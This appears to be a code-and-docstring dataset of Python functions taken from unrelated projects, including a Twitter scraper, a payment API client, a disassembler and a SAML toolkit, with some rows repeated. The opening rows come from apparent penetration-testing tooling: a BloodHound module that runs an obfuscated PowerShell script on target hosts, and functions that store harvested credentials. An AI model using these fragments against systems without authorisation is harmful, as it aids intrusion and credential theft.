1	def options(self, context, module_options): self.threads = 3 self.csv_path = 'C:\\' self.collection_method = 'Default' self.neo4j_URI = "" self.neo4j_user = "" self.neo4j_pass = "" if module_options and 'THREADS' in module_options: self.threads = module_options['THREADS'] if module_options and 'CSVPATH' in module_options: self.csv_path = module_options['CSVPATH'] if module_options and 'COLLECTIONMETHOD' in module_options: self.collection_method = module_options['COLLECTIONMETHOD'] if module_options and 'NEO4JURI' in module_options: self.neo4j_URI = module_options['NEO4JURI'] if module_options and 'NEO4JUSER' in module_options: self.neo4j_user = module_options['NEO4JUSER'] if module_options and 'NEO4JPASS' in module_options: self.neo4j_pass = module_options['NEO4JPASS'] if self.neo4j_URI != "" and self.neo4j_user != "" and self.neo4j_pass != "" : self.opsec_safe= True self.ps_script = obfs_ps_script('BloodHound-modified.ps1')	THREADS Max numbers of threads to execute on target (defaults to 20) COLLECTIONMETHOD Method used by BloodHound ingestor to collect data (defaults to 'Default') CSVPATH (optional) Path where csv files will be written on target (defaults to C:\) NEO4JURI (optional) URI for direct Neo4j ingestion (defaults to blank) NEO4JUSER (optional) Username for direct Neo4j ingestion NEO4JPASS (optional) Pass for direct Neo4j ingestion Give NEO4J options to perform direct Neo4j ingestion (no CSVs on target)
1	def stop_tracking_host(self): try: self.server.hosts.remove(self.client_address[0]) if hasattr(self.server.module, 'on_shutdown'): self.server.module.on_shutdown(self.server.context, self.server.connection) except ValueError: pass	This gets called when a module has finshed executing, removes the host from the connection tracker list
1	def remove_credentials(self, credIDs): for credID in credIDs: cur = self.conn.cursor() cur.execute("DELETE FROM users WHERE id=?", [credID]) cur.close()	Removes a credential ID from the database
1	def is_credential_valid(self, credentialID): cur = self.conn.cursor() cur.execute('SELECT * FROM users WHERE id=? LIMIT 1', [credentialID]) results = cur.fetchall() cur.close() return len(results) > 0	Check if this credential ID is valid.
1	def get_credentials(self, filterTerm=None, credtype=None): cur = self.conn.cursor() if self.is_credential_valid(filterTerm): cur.execute("SELECT * FROM users WHERE id=? LIMIT 1", [filterTerm]) elif credtype: cur.execute("SELECT * FROM users WHERE credtype=?", [credtype]) elif filterTerm and filterTerm != "": cur.execute("SELECT * FROM users WHERE LOWER(username) LIKE LOWER(?)", ['%{}%'.format(filterTerm.lower())]) else: cur.execute("SELECT * FROM users") results = cur.fetchall() cur.close() return results	Return credentials from the database.
1	def is_computer_valid(self, hostID): cur = self.conn.cursor() cur.execute('SELECT * FROM computers WHERE id=? LIMIT 1', [hostID]) results = cur.fetchall() cur.close() return len(results) > 0	Check if this computer ID is valid.
1	def get_computers(self, filterTerm=None): cur = self.conn.cursor() if self.is_computer_valid(filterTerm): cur.execute("SELECT * FROM computers WHERE id=? LIMIT 1", [filterTerm]) elif filterTerm and filterTerm != "": cur.execute("SELECT * FROM computers WHERE ip LIKE ? OR LOWER(hostname) LIKE LOWER(?)", ['%{}%'.format(filterTerm.lower()), '%{}%'.format(filterTerm.lower())]) else: cur.execute("SELECT * FROM computers") results = cur.fetchall() cur.close() return results	Return computers from the database
1	def add_computer(self, ip, hostname, domain, os, instances): cur = self.conn.cursor() cur.execute('SELECT * FROM computers WHERE ip LIKE ?', [ip]) results = cur.fetchall() if not len(results): cur.execute("INSERT INTO computers (ip, hostname, domain, os, instances) VALUES (?,?,?,?,?)", [ip, hostname, domain, os, instances]) cur.close()	Check if this host has already been added to the database, if not add it in.
1	def add_credential(self, credtype, domain, username, password): cur = self.conn.cursor() cur.execute("SELECT * FROM users WHERE credtype=? AND LOWER(domain)=LOWER(?) AND LOWER(username)=LOWER(?) AND password=?", [credtype, domain, username, password]) results = cur.fetchall() if not len(results): cur.execute("INSERT INTO users (credtype, domain, username, password) VALUES (?,?,?,?)", [credtype, domain, username, password]) cur.close()	Check if this credential has already been added to the database, if not add it in.
1	class _MetaIxTclApi(type): def __new__(cls, clsname, clsbases, clsdict): members = clsdict.get('__tcl_members__', list()) command = clsdict.get('__tcl_command__', None) for (n,m) in enumerate(members): if not isinstance(m, TclMember): raise RuntimeError('Element #%d of __tcl_members__ is not a ' 'TclMember' % (n+1,)) def fget(self, cmd=command, m=m): self._ix_get(m) val = self._api.call('%s cget -%s' % (cmd,m.name))[0] return m.type(val) def fset(self, value, cmd=command, m=m): val = self._api.call('%s config -%s %s' % (cmd,m.name,value)) self._ix_set(m) attrname = m.attrname if m.attrname is None: attrname = translate_ix_member_name(m.name) if m.doc is not None: fget.__doc__ = m.doc fget.__name__ = '_get_%s' % attrname clsdict[fget.__name__] = fget if not m.flags & FLAG_RDONLY: fset.__name__ = '_set_%s' % attrname clsdict[fset.__name__] = fset p = property(fget=fget, fset=fset) else: p = property(fget=fget) clsdict[attrname] = p t = type.__new__(cls, clsname, clsbases, clsdict) return t	Dynamically creates properties, which wraps the IxTclHAL API. The `__tcl_members__` attribute is a list of tuples of one of the following forms: TBD If no attribute name is given, it is derived from the tclMemberName by replacing every uppercase letter with the lowercase variant prepended with a '_', eg. 'portMode' will be translated to 'port_mode'. The generated methods assume that the class provides a method called '_ix_get' which fetches the properties and stores them into the IxTclHal object. Eg. for the 'port' command this would be 'port get?'.
1	class Ixia(object): def __init__(self, host): self.host = host self._tcl = TclClient(host) self._api = IxTclHalApi(self._tcl) self.chassis = Chassis(self._api, host) self.session = Session(self._api) def connect(self): self._tcl.connect() self.chassis.connect() def disconnect(self): self.chassis.disconnect() self._tcl.close() def new_port_group(self, id=None): return PortGroup(self._api, id) def discover(self): return self.chassis.discover()	This class supports only one chassis atm.
1	def hal_version(self): return tuple(self._tcl_hal_version()[0:2])	Returns a tuple (major,minor) of the TCL HAL version.
1	self.rate_delay = rate_delay	:param rate_delay: How long to pause between calls to Twitter :param error_delay: How long to pause when an error occurs
1	def __init__(self, rate_delay, error_delay=5): self.rate_delay = rate_delay self.error_delay = error_delay	:param rate_delay: How long to pause between calls to Twitter :param error_delay: How long to pause when an error occurs
1	def perform_search(self, query): url = self.construct_url(query) continue_search = True min_tweet = None response = self.execute_search(url) while response is not None and continue_search and response['items_html'] is not None: tweets = self.parse_tweets(response['items_html']) if len(tweets) == 0: break if min_tweet is None: min_tweet = tweets[0] continue_search = self.save_tweets(tweets) max_tweet = tweets[-1] if min_tweet['tweet_id'] is not max_tweet['tweet_id']: if "min_position" in response.keys(): max_position = response['min_position'] else: max_position = "TWEET-%s-%s" % (max_tweet['tweet_id'], min_tweet['tweet_id']) url = self.construct_url(query, max_position=max_position) sleep(self.rate_delay) response = self.execute_search(url)	Scrape items from twitter :param query: Query to search Twitter with. Takes form of queries constructed with using Twitters advanced search: https://twitter.com/search-advanced
1	def execute_search(self, url): try: headers = { 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.' '86 Safari/537.36' } req = requests.get(url, headers=headers) data = json.loads(req.text) return data except Exception as e: log.error(e) log.error("Sleeping for %i" % self.error_delay) sleep(self.error_delay) return self.execute_search(url)	Executes a search to Twitter for the given URL :param url: URL to search twitter with :return: A JSON object with data from Twitter
1	def save_tweets(self, tweets):	An abstract method that's called with a list of tweets. When implementing this class, you can do whatever you want with these tweets.
1	def parse_tweets(items_html): soup = BeautifulSoup(items_html, "html.parser") tweets = [] for li in soup.find_all("li", class_='js-stream-item'): if 'data-item-id' not in li.attrs: continue tweet = { 'tweet_id': li['data-item-id'], 'text': None, 'user_id': None, 'user_screen_name': None, 'user_name': None, 'created_at': None, 'retweets': 0, 'favorites': 0 } text_p = li.find("p", class_="tweet-text") if text_p is not None: tweet['text'] = text_p.get_text() user_details_div = li.find("div", class_="tweet") if user_details_div is not None: tweet['user_id'] = user_details_div['data-user-id'] tweet['user_screen_name'] = user_details_div['data-user-id'] tweet['user_name'] = user_details_div['data-name'] date_span = li.find("span", class_="_timestamp") if date_span is not None: tweet['created_at'] = float(date_span['data-time-ms']) retweet_span = li.select("span.ProfileTweet-action--retweet > span.ProfileTweet-actionCount") if retweet_span is not None and len(retweet_span) > 0: tweet['retweets'] = int(retweet_span[0]['data-tweet-stat-count']) favorite_span = li.select("span.ProfileTweet-action--favorite > span.ProfileTweet-actionCount") if favorite_span is not None and len(retweet_span) > 0: tweet['favorites'] = int(favorite_span[0]['data-tweet-stat-count']) tweets.append(tweet) return tweets	Parses Tweets from the given HTML :param items_html: The HTML block with tweets :return: A JSON list of tweets
1	def construct_url(query, max_position=None): params = { 'f': 'tweets', 'q': query } if max_position is not None: params['max_position'] = max_position url_tupple = ('https', 'twitter.com', '/i/search/timeline', '', urlencode(params), '') return urlunparse(url_tupple)	For a given query, will construct a URL to search Twitter with :param query: The query term used to search twitter :param max_position: The max_position value to select the next pagination of tweets :return: A string URL
1	def __init__(self, rate_delay, error_delay, max_tweets): super(TwitterSearchImpl, self).__init__(rate_delay, error_delay) self.max_tweets = max_tweets self.counter = 0	:param rate_delay: How long to pause between calls to Twitter :param error_delay: How long to pause when an error occurs :param max_tweets: Maximum number of tweets to collect for this example
1	def save_tweets(self, tweets): for tweet in tweets: self.counter += 1 if tweet['created_at'] is not None: t = datetime.datetime.fromtimestamp((tweet['created_at']/1000)) fmt = "%Y-%m-%d %H:%M:%S" log.info("%i [%s] - %s" % (self.counter, t.strftime(fmt), tweet['text'])) if self.max_tweets is not None and self.counter >= self.max_tweets: return False return True	Just prints out tweets :return:
1	def save_tweets(self, tweets): for tweet in tweets: self.counter += 1 if tweet['created_at'] is not None: t = datetime.datetime.fromtimestamp((tweet['created_at']/1000)) fmt = "%Y-%m-%d %H:%M:%S" log.info("%i [%s] - %s" % (self.counter, t.strftime(fmt), tweet['text'])) return True	Just prints out tweets :return: True always
1	class TwitterSlicer(TwitterSearch): def __init__(self, rate_delay, error_delay, since, until, n_threads=1): super(TwitterSlicer, self).__init__(rate_delay, error_delay) self.since = since self.until = until self.n_threads = n_threads self.counter = 0 def search(self, query): n_days = (self.until - self.since).days tp = ThreadPoolExecutor(max_workers=self.n_threads) for i in range(0, n_days): since_query = self.since + datetime.timedelta(days=i) until_query = self.since + datetime.timedelta(days=(i + 1)) day_query = "%s since:%s until:%s" % (query, since_query.strftime("%Y-%m-%d"), until_query.strftime("%Y-%m-%d")) tp.submit(self.perform_search, day_query) tp.shutdown(wait=True) def save_tweets(self, tweets): for tweet in tweets: self.counter += 1 if tweet['created_at'] is not None: t = datetime.datetime.fromtimestamp((tweet['created_at']/1000)) fmt = "%Y-%m-%d %H:%M:%S" log.info("%i [%s] - %s" % (self.counter, t.strftime(fmt), tweet['text'])) return True if __name__ == '__main__':	Inspired by: https://github.com/simonlindgren/TwitterScraper/blob/master/TwitterSucker.py The concept is to have an implementation that actually splits the query into multiple days. The only additional parameters a user has to input, is a minimum date, and a maximum date. This method also supports parallel scraping.
1	def _make_api_call(self, api_method, **kwargs): api_url = '/'.join((self.api_base_url, api_method)) parameters = dict() parameters.update(self.default_parameters) parameters.update(kwargs) post_params = urlencode(parameters).encode('utf-8') response = self.opener.open(api_url, post_params) return json.loads(response.read().decode('utf-8'))	Fire API Call for named method.
1	class Lipisha(object): def __init__(self, api_key, api_signature, api_environment=PRODUCTION_ENV, api_version=DEFAULT_API_VERSION, opener_handlers=[]): self.default_parameters = dict(api_key=api_key, api_signature=api_signature, api_version=api_version) _err = 'api_environment must be either `{}` or `{}'.format( PRODUCTION_ENV, SANDBOX_ENV) assert api_environment in (PRODUCTION_ENV, SANDBOX_ENV), _err self.api_base_url = (API_BASE_URL if api_environment == PRODUCTION_ENV else API_SANDBOX_URL) self.opener = build_opener(*opener_handlers) def _make_api_call(self, api_method, **kwargs): api_url = '/'.join((self.api_base_url, api_method)) parameters = dict() parameters.update(self.default_parameters) parameters.update(kwargs) post_params = urlencode(parameters).encode('utf-8') response = self.opener.open(api_url, post_params) return json.loads(response.read().decode('utf-8')) for api_method, required_params, optional_params in API_METHOD_CONFIGURATION:	API Client Implementation This class instantiates a client to the Lipisha API. Initialization parameters are defined below :param api_key: Lipisha API Key :param api_signature: Lipisha API Signature :param api_environment: This can either be "live" or "test". Test environment will use the Lipisha sandbox :param api_version: Lipisha API Version (Defaults to `DEFAULT_API_VERSION`) :param opener_handlers: instances of handlers to customize urllib.build_opener behaviour. this may be used to customize the how connections to Lipisha are invoved e.g. Proxy connections..
1	def lipisha_ipn(self): if not (self.request.POST.get('api_key') == LIPISHA_API_KEY and self.request.POST.get('api_signature') == LIPISHA_API_SIGNATURE): raise HTTPBadRequest return process_lipisha_payment(self.request)	Process lipisha IPN - Initiate/Acknowledge
1	class LipishadViews(object): def __init__(self, request): self.request = request self.context = request.context @view_config(name='lipisha', renderer='json', request_method='POST') def lipisha_ipn(self): if not (self.request.POST.get('api_key') == LIPISHA_API_KEY and self.request.POST.get('api_signature') == LIPISHA_API_SIGNATURE): raise HTTPBadRequest return process_lipisha_payment(self.request)	Payment views to receive callbacks from payment providers
1	def process_lipisha_payment(request): log.debug(request.POST) schema = LipishaInitiateSchema api_type = request.POST.get('api_type') if api_type == TYPE_ACKNOWLEDGE: schema = LipishaAcknowledgeSchema form = Form(request, schema()) transaction_status_code = STATUS_SUCCESS transaction_status = 'Processed' transaction_status_description = 'Processed' if form.validate(): if api_type == TYPE_INITIATE: pass elif api_type == TYPE_ACKNOWLEDGE: if form.data.get('transaction_status_code') == STATUS_SUCCESS: pass else: log.error('Invalid payment acknowledgement') log.error(request.POST) else: log.error("Error while processing payment") for error in form.all_errors(): log.error(error) transaction_status_code = STATUS_INITIATE_FAILURE transaction_status = 'Error' transaction_status_description = 'Error while processing' if api_type == TYPE_INITIATE: data = request.POST return dict( api_key=LIPISHA_API_KEY, api_signature=LIPISHA_API_SIGNATURE, api_version=data.get('api_version'), api_type=TYPE_RECEIPT, transaction_reference=data.get('transaction_reference'), transaction_status_code=transaction_status_code, transaction_status=transaction_status, transaction_status_description=transaction_status_description, ) return {}	Handle payment received and respond with a dictionary
1	def __init__(self, start_address, end_address, instructions): self.start_address = start_address self.end_address = end_address self.instructions = instructions	:param start_address: Address of first instruction in basic block. :param end_address: Address of first instruction in physically bordering basic block. :param instructions: List of instruction addresses in basic block (used for identifying instruction boundaries without disassembling them again and again).
1	class BasicBlock(object): def __init__(self, start_address, end_address, instructions): self.start_address = start_address self.end_address = end_address self.instructions = instructions def __str__(self): return '' % (self.start_address, self.end_address) def __eq__(self, other): return self.start_address == other.start_address and \ self.end_address == other.end_address def __hash__(self): return self.start_address def __contains__(self, address): return self.start_address <= address < self.end_address	Represents a basic block in the CFG. .. automethod:: __init__
1	def __init__(self, classifier_id=CLASSIFIER_NAIVE): self.classifier_id = classifier_id	:param classifier_id: Id of classifier to instantiate and use as backend.
1	def is_code(self, insns): r = False if self.classifier_id == CLASSIFIER_NAIVE: r = naive.is_code(insns) return r	Determine if *insns* look like valid code or data. :param insns: A ``list`` of decoded instructions to examine. :returns: ``True`` if *insns* look like code, ``False`` otherwise. :rtype: ``bool``
1	def is_data(self, insns): return not(self.is_code(insns))	This is the exact opposite of :func:`is_code()` defined above. :param insns: A ``list`` of decoded instructions to examine. :returns: ``True`` if *insns* look like data, ``False`` otherwise. :rtype: ``bool``
1	class Classifier(object): def __init__(self, classifier_id=CLASSIFIER_NAIVE): self.classifier_id = classifier_id def is_code(self, insns): r = False if self.classifier_id == CLASSIFIER_NAIVE: r = naive.is_code(insns) return r def is_data(self, insns): return not(self.is_code(insns))	Main classification class. .. automethod:: __init__
1	def get_program_counter_name(self): name = None if self.mode == X86_MODE_REAL: name = pyxed.XED_REG_IP elif self.mode == X86_MODE_PROTECTED_32BIT: name = pyxed.XED_REG_EIP elif self.mode == X86_MODE_PROTECTED_64BIT: name = pyxed.XED_REG_RIP return name	Get name of program counter register. :returns: Name of program counter register. :rtype: ``int``
1	def get_stack_pointer_name(self): name = None if self.mode == X86_MODE_REAL: name = pyxed.XED_REG_SP elif self.mode == X86_MODE_PROTECTED_32BIT: name = pyxed.XED_REG_ESP elif self.mode == X86_MODE_PROTECTED_64BIT: name = pyxed.XED_REG_RSP return name	Get name of stack pointer register. :returns: Name of stack pointer register. :rtype: ``int``
1	def get_segment_register_names(self): names = set() if self.mode == X86_MODE_REAL: names.update([pyxed.XED_REG_CS, pyxed.XED_REG_DS, pyxed.XED_REG_ES, pyxed.XED_REG_SS]) elif self.mode == X86_MODE_PROTECTED_32BIT: names.update([pyxed.XED_REG_CS, pyxed.XED_REG_DS, pyxed.XED_REG_ES, pyxed.XED_REG_FS, pyxed.XED_REG_GS, pyxed.XED_REG_SS]) elif self.mode == X86_MODE_PROTECTED_64BIT: names.update([pyxed.XED_REG_CS, pyxed.XED_REG_DS, pyxed.XED_REG_ES, pyxed.XED_REG_FS, pyxed.XED_REG_GS, pyxed.XED_REG_SS]) return names	Get set of segment register names. :returns: Set of segment register names. :rtype: ``set``
1	def disassemble(self): _msg('Beginning early analysis') self._analyze_relocations() _msg('Beginning disassembly') self._disassemble_entry_points() self._disassemble_functions() self._disassemble_relocated() self._disassemble_deferred() self._disassemble_orphan() _msg('Building program structure') self._build_basic_block_set() self._build_cfg() _msg('Disassembly completed')	Start disassembly of S.EX. project.
1	def is_memory_readable(self, address, length=1): section = self.loader.get_section_for_address_range(address, length) return section is not None and 'r' in section.flags	Check if specified address range is readable. :param address: Address to start checking from. :param length: Number of bytes to check. :returns: ``True`` if memory region is readable, ``False`` otherwise. :rtype: ``bool``
1	def is_memory_writable(self, address, length=1): section = self.loader.get_section_for_address_range(address, length) return section is not None and 'w' in section.flags	Check if specified address range is writable. :param address: Address to start checking from. :param length: Number of bytes to check. :returns: ``True`` if memory region is writable, ``False`` otherwise. :rtype: ``bool``
1	def is_memory_executable(self, address, length=1): section = self.loader.get_section_for_address_range(address, length) return section is not None and 'x' in section.flags	Check if specified address range is executable. :param address: Address to start checking from. :param length: Number of bytes to check. :returns: ``True`` if memory region is executable, ``False`` otherwise. :rtype: ``bool``
1	def is_memory_mapped(self, address, length=1): section = self.loader.get_section_for_address_range(address, length) return section is not None and 'l' in section.flags	Check if specified address range is mapped (i.e. falls within one of the binary's load segments). :param address: Address to start checking from. :param length: Number of bytes to check. :returns: ``True`` if memory region is mapped, ``False`` otherwise. :rtype: ``bool``
1	def read_memory(self, address, length): return self.loader.read(address, length)	Read *length* bytes from memory address *address*. :param address: Address to read data from. :param length: Number of bytes to read. :returns: A string of *length* bytes. :rtype: ``str``
1	def get_instruction(self, address): r = None if self.shadow.is_marked_as_code(address) and \ self.shadow.is_marked_as_head(address): section = self.loader.get_section_for_address_range(address) self.decoder.itext = section.data self.decoder.itext_offset = address - section.start_address self.decoder.runtime_address = section.start_address try: insn = self.decoder.decode() except (pyxed.InvalidInstructionError, pyxed.InvalidOffsetError): insn = None if insn is not None: r = instruction.Instruction(insn, self.cpu) return r	Return an :class:`instruction.Instruction` instance for the instruction at address *address*. :param address: Address of instruction whose object to return. :returns: Instruction object for instruction at *address* or ``None``. :rtype: :class:`instruction.Instruction`
1	def get_basic_block(self, address): r = None if self.shadow.start_address <= address <= self.shadow.end_address: while not self.shadow.is_marked_as_basic_block_leader(address): address -= 1 r = self.basic_blocks[address] return r	Return the :class:`basic_block.BasicBlock` instance of the basic block that contains address *address*. :param address: Address whose basic block object to look up and return. :returns: The basic block instance that contains *address* or ``None``. :rtype: :class:`basic_block.BasicBlock`
1	def get_function(self, address): r = None if self.shadow.is_marked_as_function(address): addresses = [] seen = set() stack = [address] while len(stack): address = stack.pop() if address not in seen: seen.add(address) addresses.append(address) stack += [a for a in self.cfg.get_successors(address) \ if a not in seen and not self.shadow.is_marked_as_function(a)] r = [self.basic_blocks[a] for a in addresses] return r	Return a list of :class:`basic_block.BasicBlock` instances corresponding to the basic blocks of function at address *address*. :param address: Address of function whose basic block list to return. :return: List of basic blocks of function or ``None``. :rtype: ``list``
1	def close(self): self.shadow.close() self.basic_blocks.close() self.code_xrefs.close() self.data_xrefs.close() self.cfg.close()	Release all resources and finalize the disassembler.
1	def _analyze_normal_instruction_memory_operands(self, insn): runtime_address = insn.runtime_address for i in range(insn.get_number_of_memory_operands()): displacement = insn.get_memory_displacement(i) if displacement and self.is_memory_mapped(displacement): self.data_xrefs.add_edge((runtime_address, displacement)) length = insn.get_memory_operand_length(i) if length not in [4, 6, 8, 10]: self.shadow.mark_as_analyzed(displacement, length) self.shadow.mark_as_data(displacement, length)	Analyze normal (i.e. not flow control) instruction memory operands and update the sets of code and data cross references accordingly. :param insn: Instruction object to be analyzed. .. warning:: This is a private function, don't use it directly.
1	def _analyze_flow_control_instruction_memory_operands(self, insn): runtime_address = insn.runtime_address for i in range(insn.get_number_of_memory_operands()): displacement = insn.get_memory_displacement(i) if displacement and self.is_memory_mapped(displacement): self.data_xrefs.add_edge((runtime_address, displacement)) self._analyze_flow_control_instruction_memory_operand(insn, i)	Analyze the memory operands of a flow control instruction. The sets of code and data cross references are updated accordingly. :param insn: Instruction object whose memory operands will be analyzed. .. warning:: This is a private function, don't use it directly.
1	def _disassemble_unconditional_jump_instruction(self, insn): runtime_address = insn.runtime_address iform = insn.get_iform() if iform in [pyxed.XED_IFORM_JMP_RELBRb, pyxed.XED_IFORM_JMP_RELBRd, pyxed.XED_IFORM_JMP_RELBRz]: displacement = insn.get_branch_displacement() if self.is_memory_executable(displacement): self.code_xrefs.add_edge((runtime_address, displacement)) self.shadow.mark_as_basic_block_leader(displacement) elif iform in [pyxed.XED_IFORM_JMP_MEMv, pyxed.XED_IFORM_JMP_FAR_MEMp2]: self._analyze_flow_control_instruction_memory_operands(insn) elif iform == pyxed.XED_IFORM_JMP_GPRv: pass elif iform == pyxed.XED_IFORM_JMP_FAR_PTRp_IMMw: displacement = insn.get_branch_displacement() if self.is_memory_executable(displacement): self.code_xrefs.add_edge((runtime_address, displacement)) self.shadow.mark_as_basic_block_leader(displacement) elif iform == pyxed.XED_IFORM_XABORT_IMMb: pass else: raise RuntimeError('Unknown unconditional jump form "%s"' % \ insn.dump_intel_format())	Disassemble unconditional jump instruction. :param insn: Instruction object to be analyzed. :raises RuntimeError: Raised when an unknown form of an unconditional jump instruction is encountered. .. warning:: This is a private function, don't use it directly.
1	def _disassemble_conditional_jump_instruction(self, insn): runtime_address = insn.runtime_address iform = insn.get_iform() if iform != pyxed.XED_IFORM_XEND: displacement = insn.get_branch_displacement() if self.is_memory_executable(displacement): edge = (runtime_address, displacement) self.code_xrefs.add_edge(edge) self.code_xrefs.add_edge_attribute(edge, 'predicate', True) self.shadow.mark_as_basic_block_leader(displacement) next_address = insn.get_next_instruction_address() edge = (runtime_address, next_address) self.code_xrefs.add_edge(edge) self.code_xrefs.add_edge_attribute(edge, 'predicate', False) self.shadow.mark_as_basic_block_leader(next_address)	Disassemble conditional jump instruction. :param insn: Instruction object to be analyzed. .. warning:: This is a private function, don't use it directly.
1	def __init__(self, request_data, old_settings=None, custom_base_path=None): self.__request_data = request_data if isinstance(old_settings, OneLogin_Saml2_Settings): self.__settings = old_settings else: self.__settings = OneLogin_Saml2_Settings(old_settings, custom_base_path) self.__attributes = dict() self.__nameid = None self.__nameid_format = None self.__session_index = None self.__session_expiration = None self.__authenticated = False self.__errors = [] self.__error_reason = None self.__last_request_id = None self.__last_message_id = None self.__last_assertion_id = None self.__last_authn_contexts = [] self.__last_request = None self.__last_response = None self.__last_assertion_not_on_or_after = None	Initializes the SP SAML instance. :param request_data: Request Data :type request_data: dict :param old_settings: Optional. SAML Toolkit Settings :type old_settings: dict :param custom_base_path: Optional. Path where are stored the settings file and the cert folder :type custom_base_path: string
1	def get_settings(self): return self.__settings	Returns the settings info :return: Setting info :rtype: OneLogin_Saml2_Setting object
1	def set_strict(self, value): assert isinstance(value, bool) self.__settings.set_strict(value)	Set the strict mode active/disable :param value: :type value: bool
1	def process_response(self, request_id=None): self.__errors = [] self.__error_reason = None if 'post_data' in self.__request_data and 'SAMLResponse' in self.__request_data['post_data']: response = OneLogin_Saml2_Response(self.__settings, self.__request_data['post_data']['SAMLResponse']) self.__last_response = response.get_xml_document() if response.is_valid(self.__request_data, request_id): self.__attributes = response.get_attributes() self.__nameid = response.get_nameid() self.__nameid_format = response.get_nameid_format() self.__session_index = response.get_session_index() self.__session_expiration = response.get_session_not_on_or_after() self.__last_message_id = response.get_id() self.__last_assertion_id = response.get_assertion_id() self.__last_authn_contexts = response.get_authn_contexts() self.__authenticated = True self.__last_assertion_not_on_or_after = response.get_assertion_not_on_or_after() else: self.__errors.append('invalid_response') self.__error_reason = response.get_error() else: self.__errors.append('invalid_binding') raise OneLogin_Saml2_Error( 'SAML Response not found, Only supported HTTP_POST Binding', OneLogin_Saml2_Error.SAML_RESPONSE_NOT_FOUND )	Process the SAML Response sent by the IdP. :param request_id: Is an optional argument. Is the ID of the AuthNRequest sent by this SP to the IdP. :type request_id: string :raises: OneLogin_Saml2_Error.SAML_RESPONSE_NOT_FOUND, when a POST with a SAMLResponse is not found
1	def redirect_to(self, url=None, parameters={}): if url is None and 'RelayState' in self.__request_data['get_data']: url = self.__request_data['get_data']['RelayState'] return OneLogin_Saml2_Utils.redirect(url, parameters, request_data=self.__request_data)	Redirects the user to the URL passed by parameter or to the URL that we defined in our SSO Request. :param url: The target URL to redirect the user :type url: string :param parameters: Extra parameters to be passed as part of the URL :type parameters: dict :returns: Redirection URL
1	def is_authenticated(self): return self.__authenticated	Checks if the user is authenticated or not. :returns: True if is authenticated, False if not :rtype: bool
1	def get_attributes(self): return self.__attributes	Returns the set of SAML attributes. :returns: SAML attributes :rtype: dict
1	def get_nameid(self): return self.__nameid	Returns the nameID. :returns: NameID :rtype: string|None
1	def get_nameid_format(self): return self.__nameid_format	Returns the nameID Format. :returns: NameID Format :rtype: string|None
1	def get_session_index(self): return self.__session_index	Returns the SessionIndex from the AuthnStatement. :returns: The SessionIndex of the assertion :rtype: string
1	def get_session_expiration(self): return self.__session_expiration	Returns the SessionNotOnOrAfter from the AuthnStatement. :returns: The SessionNotOnOrAfter of the assertion :rtype: DateTime|None
1	def get_last_assertion_not_on_or_after(self): return self.__last_assertion_not_on_or_after	The NotOnOrAfter value of the valid SubjectConfirmationData node (if any) of the last assertion processed
1	def get_errors(self): return self.__errors	Returns a list with code errors if something went wrong :returns: List of errors :rtype: list
1	def get_last_error_reason(self): return self.__error_reason	Returns the reason for the last error :returns: Reason of the last error :rtype: None | string
1	def __init__(self, request_data, old_settings=None, custom_base_path=None): self.__request_data = request_data if isinstance(old_settings, OneLogin_Saml2_Settings): self.__settings = old_settings else: self.__settings = OneLogin_Saml2_Settings(old_settings, custom_base_path) self.__attributes = dict() self.__nameid = None self.__nameid_format = None self.__session_index = None self.__session_expiration = None self.__authenticated = False self.__errors = [] self.__error_reason = None self.__last_request_id = None self.__last_message_id = None self.__last_assertion_id = None self.__last_authn_contexts = [] self.__last_request = None self.__last_response = None self.__last_assertion_not_on_or_after = None	Initializes the SP SAML instance. :param request_data: Request Data :type request_data: dict :param old_settings: Optional. SAML Toolkit Settings :type old_settings: dict :param custom_base_path: Optional. Path where are stored the settings file and the cert folder :type custom_base_path: string
1	def get_settings(self): return self.__settings	Returns the settings info :return: Setting info :rtype: OneLogin_Saml2_Setting object
1	def set_strict(self, value): assert isinstance(value, bool) self.__settings.set_strict(value)	Set the strict mode active/disable :param value: :type value: bool
1	def process_response(self, request_id=None): self.__errors = [] self.__error_reason = None if 'post_data' in self.__request_data and 'SAMLResponse' in self.__request_data['post_data']: response = OneLogin_Saml2_Response(self.__settings, self.__request_data['post_data']['SAMLResponse']) self.__last_response = response.get_xml_document() if response.is_valid(self.__request_data, request_id): self.__attributes = response.get_attributes() self.__nameid = response.get_nameid() self.__nameid_format = response.get_nameid_format() self.__session_index = response.get_session_index() self.__session_expiration = response.get_session_not_on_or_after() self.__last_message_id = response.get_id() self.__last_assertion_id = response.get_assertion_id() self.__last_authn_contexts = response.get_authn_contexts() self.__authenticated = True self.__last_assertion_not_on_or_after = response.get_assertion_not_on_or_after() else: self.__errors.append('invalid_response') self.__error_reason = response.get_error() else: self.__errors.append('invalid_binding') raise OneLogin_Saml2_Error( 'SAML Response not found, Only supported HTTP_POST Binding', OneLogin_Saml2_Error.SAML_RESPONSE_NOT_FOUND )	Process the SAML Response sent by the IdP. :param request_id: Is an optional argument. Is the ID of the AuthNRequest sent by this SP to the IdP. :type request_id: string :raises: OneLogin_Saml2_Error.SAML_RESPONSE_NOT_FOUND, when a POST with a SAMLResponse is not found
1	def redirect_to(self, url=None, parameters={}): if url is None and 'RelayState' in self.__request_data['get_data']: url = self.__request_data['get_data']['RelayState'] return OneLogin_Saml2_Utils.redirect(url, parameters, request_data=self.__request_data)	Redirects the user to the URL passed by parameter or to the URL that we defined in our SSO Request. :param url: The target URL to redirect the user :type url: string :param parameters: Extra parameters to be passed as part of the URL :type parameters: dict :returns: Redirection URL
1	def is_authenticated(self): return self.__authenticated	Checks if the user is authenticated or not. :returns: True if is authenticated, False if not :rtype: bool
1	def get_attributes(self): return self.__attributes	Returns the set of SAML attributes. :returns: SAML attributes :rtype: dict
1	def get_nameid(self): return self.__nameid	Returns the nameID. :returns: NameID :rtype: string|None
1	def get_nameid_format(self): return self.__nameid_format	Returns the nameID Format. :returns: NameID Format :rtype: string|None
1	def get_session_index(self): return self.__session_index	Returns the SessionIndex from the AuthnStatement. :returns: The SessionIndex of the assertion :rtype: string
1	def get_session_expiration(self): return self.__session_expiration	Returns the SessionNotOnOrAfter from the AuthnStatement. :returns: The SessionNotOnOrAfter of the assertion :rtype: DateTime|None
1	def get_last_assertion_not_on_or_after(self): return self.__last_assertion_not_on_or_after	The NotOnOrAfter value of the valid SubjectConfirmationData node (if any) of the last assertion processed
1	def get_errors(self): return self.__errors	Returns a list with code errors if something went wrong :returns: List of errors :rtype: list
